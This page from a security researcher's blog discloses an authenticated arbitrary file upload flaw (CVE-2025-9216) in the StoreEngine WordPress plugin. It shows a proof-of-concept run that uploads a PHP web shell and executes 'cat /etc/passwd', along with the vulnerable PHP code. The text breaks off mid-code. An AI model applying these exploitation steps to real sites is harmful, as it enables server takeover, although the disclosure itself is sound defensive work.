<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.d451ff92e80abc2a828eb9bb262e4db374bd4e954642f9245c54eec84bf690f3.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/images/favicon.ico>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">Ryan Kozak - StoreEngine – Powerful WordPress eCommerce Plugin for Payments, Memberships, Affiliates, Sales &amp; More &lt;= 1.4.0 - Authenticated (Subscriber&#43;) Arbitrary File Upload</title>
<meta property="og:title" content=Ryan&#32;Kozak&#32;-&#32;StoreEngine&#32;–&#32;Powerful&#32;WordPress&#32;eCommerce&#32;Plugin&#32;for&#32;Payments,&#32;Memberships,&#32;Affiliates,&#32;Sales&#32;&amp;&#32;More&#32;&lt;&#61;&#32;1.4.0&#32;-&#32;Authenticated&#32;(Subscriber&#43;)&#32;Arbitrary&#32;File&#32;Upload />
<meta name="twitter:title" content=Ryan&#32;Kozak&#32;-&#32;StoreEngine&#32;–&#32;Powerful&#32;WordPress&#32;eCommerce&#32;Plugin&#32;for&#32;Payments,&#32;Memberships,&#32;Affiliates,&#32;Sales&#32;&amp;&#32;More&#32;&lt;&#61;&#32;1.4.0&#32;-&#32;Authenticated&#32;(Subscriber&#43;)&#32;Arbitrary&#32;File&#32;Upload />
<meta itemprop="name" content=Ryan&#32;Kozak&#32;-&#32;StoreEngine&#32;–&#32;Powerful&#32;WordPress&#32;eCommerce&#32;Plugin&#32;for&#32;Payments,&#32;Memberships,&#32;Affiliates,&#32;Sales&#32;&amp;&#32;More&#32;&lt;&#61;&#32;1.4.0&#32;-&#32;Authenticated&#32;(Subscriber&#43;)&#32;Arbitrary&#32;File&#32;Upload />
<meta name="application-name" content=Ryan&#32;Kozak&#32;-&#32;StoreEngine&#32;–&#32;Powerful&#32;WordPress&#32;eCommerce&#32;Plugin&#32;for&#32;Payments,&#32;Memberships,&#32;Affiliates,&#32;Sales&#32;&amp;&#32;More&#32;&lt;&#61;&#32;1.4.0&#32;-&#32;Authenticated&#32;(Subscriber&#43;)&#32;Arbitrary&#32;File&#32;Upload />
<meta property="og:site_name" content="" />


<meta name="description" content=CVE-2025-9216:&#32;WordPress&#32;StoreEngine&#32;plugin&#32;arbitrary&#32;file&#32;upload&#32;vulnerability&#32;allowing&#32;any&#32;authenticated&#32;user&#32;to&#32;upload&#32;PHP&#32;shells. />



<base href="https://ryankozak.com/posts/cve-2025-9216/" />
<link rel="canonical" href="https://ryankozak.com/posts/cve-2025-9216/" itemprop="url" />
<meta name="url" content="https://ryankozak.com/posts/cve-2025-9216/" />
<meta name="twitter:url" content="https://ryankozak.com/posts/cve-2025-9216/" />
<meta property="og:url" content="https://ryankozak.com/posts/cve-2025-9216/" />


<meta property="og:updated_time" content="2025-09-16T00:01:00Z" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.152.2">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

    
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type":  "Person",
  "@id":    "https://ryankozak.com/#ryan-kozak",
  "name":   "Ryan Kozak",
  "jobTitle": "Offensive Security Engineer - Security Researcher",
  "url":    "https://ryankozak.com",
  "image":  "https://ryankozak.com/images/ryan-kozak.jpg",
  "description": "Known hacker, cybersecurity researcher, former OWASP Sacramento Chapter lead, credited with multiple CVEs.",
  "sameAs": [
      "https://github.com/d0n601",
      "https://www.linkedin.com/in/ryan-kozak\/",
      "https://patchstack.com/database/researcher/ryan-kozak",
      "https://www.wordfence.com/threat-intel/vulnerabilities/researchers/ed9aaed9-ca13-413a-a5e3-af97095a4252",
      "https://stackoverflow.com/users/4681506/ryan-kozak"
  ],
  "knowsAbout": ["Hacking", "Red Teaming", "Offensive Security", "Penetration Testing", "Programming"]
}
</script> 
    <script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "WebSite",
  "@id": "https://ryankozak.com/#website",
  "url": "https://ryankozak.com/",
  "name": "RyanKozak.com",
  "publisher": { "@id": "https://ryankozak.com/#ryan-kozak" },
}
</script>
    
    </head>

    <body class="">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://ryankozak.com/">
                <img src="/images/d0n601.jpg" alt="brand image">
            </a>
        
        
            <a href="https://ryankozak.com/">
                <h1>Ryan Kozak</h1>
            </a>
        
    </h1>
    <p class="lead">
    Hacking, CVEs, Development, and Other Things.
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about">About Me</a>
                    </li>
                    
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Recent</a>
                    </li>
                    
                        <li class="sub-heading">
                            
                        </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2025-12673/">Flex QR Code Generator &lt;= 1.2.6 - Unauthenticated Arbitrary File Upload</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2025-13390/">WP Directory Kit &lt;= 1.4.4 - Authentication Bypass to Privilege Escalation via Account Takeover</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2025-12585/">MxChat – AI Chatbot for WordPress &lt;= 2.5.5 - Unauthenticated Information Exposure</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2025-13597/">AI Feeds &lt;= 1.0.11 - Unauthenticated Arbitrary File Upload</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/d0n601">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/ryan-kozak/">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>















    <a target="_blank" class="social" title="RSS Feed" href="/posts/index.xml">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
            </g>
        </svg>
    </a>


    <a target="_blank" class="social" title="Email" href="mailto:website@ryankozak.com">
       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
       </svg>
    </a>




        <p class="footnote">
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "TechArticle",
  "@id": "https:\/\/ryankozak.com\/posts\/cve-2025-9216\/#article",
  "headline": "\"StoreEngine – Powerful WordPress eCommerce Plugin for Payments, Memberships, Affiliates, Sales \\u0026 More \\u003c= 1.4.0 - Authenticated (Subscriber+) Arbitrary File Upload\"",
  "author": { "@id": "" },
  "datePublished": "2025-09-16",
  "dateModified": "2025-09-16",
  "inLanguage": "en",
  "keywords": "[\"CVE\",\"WordPress\",\"StoreEngine\"]",
  "mainEntityOfPage": { "@type": "WebPage", "@id": "https:\/\/ryankozak.com\/posts\/cve-2025-9216\/" }
}
</script>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type":    "TechArticle",
  "headline": "\"StoreEngine – Powerful WordPress eCommerce Plugin for Payments, Memberships, Affiliates, Sales \\u0026 More \\u003c= 1.4.0 - Authenticated (Subscriber+) Arbitrary File Upload\"",
  "datePublished": "2025-09-16",
  "dateModified":  "2025-09-16",
  "author":   { "@id": "https:\/\/ryankozak.com\/#ryan-kozak" },
  "publisher": {
    "@type": "Organization",
    "name":  "Ryan Kozak",
    "logo": {
      "@type": "ImageObject",
      "url": "\/images\/d0n601.png"
    }
  },
  "image": "null",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https:\/\/ryankozak.com\/posts\/cve-2025-9216\/"
  }
}
</script>
<div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://ryankozak.com/posts/cve-2025-9216/">StoreEngine – Powerful WordPress eCommerce Plugin for Payments, Memberships, Affiliates, Sales &amp; More &lt;= 1.4.0 - Authenticated (Subscriber&#43;) Arbitrary File Upload</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2025-09-16T00:01:00Z" class="post-date">
        September 16, 2025
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>3 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-CVE">
        <a href="https://ryankozak.com/tags/cve">CVE</a>
      </li>
      
      <li class="tag-WordPress">
        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
      </li>
      
      <li class="tag-StoreEngine">
        <a href="https://ryankozak.com/tags/storeengine">StoreEngine</a>
      </li>
      
    </ul>
    
  </div>

  
  

  
</div>

  <h3 id="cve-2025-9216">CVE-2025-9216</h3>
<p>The <a href="https://wordpress.org/plugins/storeengine/" target="_blank">StoreEngine</a> plugin contains a vulnerability in it&rsquo;s CSV Import/Export feature that allows <strong>any authenticated user</strong> (subscriber, author, editor, etc.) to upload arbitrary files and gain remote code execution. The vulnerability stems from two security flaws: (1) the CSV import endpoint lacks proper file validation checks, permission checks, and only relies on nonce verification for security, and (2) the <code>storeengine_nonce</code> is exposed to <strong>ALL frontend users</strong> through the plugin&rsquo;s JavaScript. This combination allows any authenticated user to extract the nonce from frontend pages and use it to upload PHP web shells via the <code>storeengine_csv/import</code> endpoint, effectively granting subscriber+ users the ability to execute arbitrary code on the server.</p>
<h2 id="tldr-exploits">TL;DR Exploits</h2>
<ul>
<li>A POC <a href="https://github.com/d0n601/CVE-2025-9216/blob/master/CVE-2025-9216.py" target="_blank">CVE-2025-9216.py</a> is provided to demonstrate an administrator uploading a web shell named <code>omg.php</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>python3 ./CVE-2025-9216.py http://localhost:1337 user1 password
</span></span><span style="display:flex;"><span>Logging into: http://localhost:1337/wp-admin
</span></span><span style="display:flex;"><span>NOTE: This exploit works with any authenticated user (subscriber, author, editor, etc.)
</span></span><span style="display:flex;"><span>Extracting nonce from frontend scripts (accessible to any user)...
</span></span><span style="display:flex;"><span>storeengine_nonce: ff15beb1bd
</span></span><span style="display:flex;"><span>NOTE: This nonce is exposed to ALL frontend users, making the vulnerability exploitable by any authenticated user!
</span></span><span style="display:flex;"><span>NOTE: CSV Import/Export addon must be enabled by an administrator before exploitation.
</span></span><span style="display:flex;"><span>This exploit demonstrates the vulnerability once the addon is already enabled.
</span></span><span style="display:flex;"><span>Uploading web shell: omg.php
</span></span><span style="display:flex;"><span>File upload response: {&#34;success&#34;:true,&#34;data&#34;:{&#34;filename&#34;:&#34;omg.php&#34;}}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Web Shell At: http://localhost:1337/wp-content/uploads/storeengine_uploads/csv/omg.php
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Executing test command: cat /etc/passwd
</span></span><span style="display:flex;"><span>&lt;pre&gt;root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>&lt;/pre&gt;
</span></span></code></pre></div><h2 id="details">Details</h2>
<h3 id="vulnerable-file-upload-function"><strong>Vulnerable File Upload Function</strong></h3>
<p>The <code>storeengine_csv/import</code> AJAX action calls the <code>import()</code> function on line <a href="https://plugins.trac.wordpress.org/browser/storeengine/trunk/addons/csv/ajax/import.php#L51" target="_blank">51</a> of <code>/wp-content/plugins/storeengine/addons/csv/ajax/import.php</code>, which lacks proper permission checks and file type validation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">import</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span> <span style="color:#a6e22e">isset</span>( $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>] ) ) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wp_send_json_error</span>( <span style="color:#e6db74">&#39;No file uploaded.&#39;</span> );
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $file   <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>];
</span></span><span style="display:flex;"><span>    $folder <span style="color:#f92672">=</span> <span style="color:#a6e22e">Helper</span><span style="color:#f92672">::</span><span style="color:#a6e22e">get_upload_dir</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/csv/&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span> <span style="color:#a6e22e">file_exists</span>( $folder ) ) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wp_mkdir_p</span>( $folder );
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">sanitize_file_name</span>( $file[<span style="color:#e6db74">&#39;name&#39;</span>] );
</span></span><span style="display:flex;"><span>    $target   <span style="color:#f92672">=</span> <span style="color:#a6e22e">trailingslashit</span>( $folder ) <span style="color:#f92672">.</span> $filename;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span> <span style="color:#a6e22e">move_uploaded_file</span>( $file[<span style="color:#e6db74">&#39;tmp_name&#39;</span>], $target ) ) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wp_send_json_error</span>( <span style="color:#e6db74">&#39;Failed to move uploaded file.&#39;</span> );
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wp_send_json_success</span>( [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;filename&#39;</span> <span style="color:#f92672">=&gt;</span> $filename,
</span></span><span style="display:flex;"><span>    ] );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The function only uses <code>sanitize_file_name()</code> to clean the filename but does not perform any file type validation or capability checks. This allows uploading any file type, including PHP files that can be executed by the web server.</p>
<h3 id="nonce-exposure-vulnerability"><strong>Nonce Exposure Vulnerability</strong></h3>
<p>The <code>storeengine_nonce</code> is exposed to <strong>ALL frontend users</strong> through the plugin&rsquo;s JavaScript. This occurs in the <code>_get_script_data()</code> method on line <a href="https://plugins.trac.wordpress.org/browser/storeengine/trunk/includes/assets.php#L279" target="_blank">279</a> of <code>/wp-content/plugins/storeengine/includes/assets.php</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_get_script_data</span>()<span style="color:#f92672">:</span> <span style="color:#66d9ef">array</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ... other data ...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;nonce&#39;</span>             <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">wp_create_nonce</span>( <span style="color:#e6db74">&#39;wp_rest&#39;</span> ),
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;storeengine_nonce&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">wp_create_nonce</span>( <span style="color:#e6db74">&#39;storeengine_nonce&#39;</span> ), <span style="color:#75715e">// Line 279 - EXPOSED TO ALL USERS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#39;rest_url&#39;</span>          <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">esc_url_raw</span>( <span style="color:#a6e22e">rest_url</span>() ),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ... other data ...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This nonce is then localized to frontend JavaScript via the <code>frontend_scripts()</code> method on line <a href="https://plugins.trac.wordpress.org/browser/storeengine/trunk/includes/assets.php#L120" target="_blank">120</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">wp_localize_script</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;storeengine-frontend-scripts&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;StoreEngineGlobal&#39;</span>,
</span></span><span style="display:flex;"><span>    $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_frontend_script_data</span>() <span style="color:#75715e">// Calls _get_script_data()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>);
</span></span></code></pre></div><h3 id="nonce-verification"><strong>Nonce Verification</strong></h3>
<p>The nonce is verified in the <code>AbstractRequestHandler::check_permission()</code> method on line <a href="https://plugins.trac.wordpress.org/browser/storeengine/trunk/includes/classes/abstract-request-handler.php#L510" target="_blank">510</a> of <code>/wp-content/plugins/storeengine/includes/classes/abstract-request-handler.php</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check_permission</span>( <span style="color:#a6e22e">string</span> $capability, <span style="color:#a6e22e">bool</span> $allow_visitors <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span> ) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( ( <span style="color:#f92672">!</span> <span style="color:#a6e22e">is_user_logged_in</span>() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> $allow_visitors ) <span style="color:#f92672">||</span> ( <span style="color:#a6e22e">is_user_logged_in</span>() <span style="color:#f92672">&amp;&amp;</span> $capability <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">current_user_can</span>( $capability ) ) ) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WP_Error</span>(<span style="color:#75715e">/* ... */</span>);
